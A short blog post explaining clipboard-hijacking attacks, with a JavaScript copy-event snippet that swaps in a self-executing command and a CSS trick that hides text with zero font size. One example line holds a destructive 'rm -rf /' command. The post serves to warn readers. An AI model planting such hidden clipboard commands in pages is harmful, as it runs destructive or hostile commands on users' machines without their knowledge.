on Copy Paste

on Hacking 29 May 2020

Javascript is extremely powerful, to say the least. One of its often overlooked features is the copy event listener.

What damage can that do? Here, copy this â€˜innocentâ€™ command and paste it somewhere else.

$ echo "innocent text"

The text you just copied even has an Enter character so the command will execute automatically and I will have control over this system before you can comprehend what just went down.

This is how the code works,

document.getElementById('fakecopy').addEventListener('copy', function(e) {
    e.clipboardData.setData('text/plain',
        'echo "This could\'ve be something malicious!ðŸ˜ˆ"\n');
    e.preventDefault();
});

Think youâ€™ll be safe if you disable your javascript? Sorry to burst your bubble but this can also be done with raw CSS.

$ echo ; rm -rf / ; echo "looks safe to me!"

This is how that works,

$ echo <span style="font-size: 0">; echo 'malicious command' ; echo </span>"looks safe to me!"
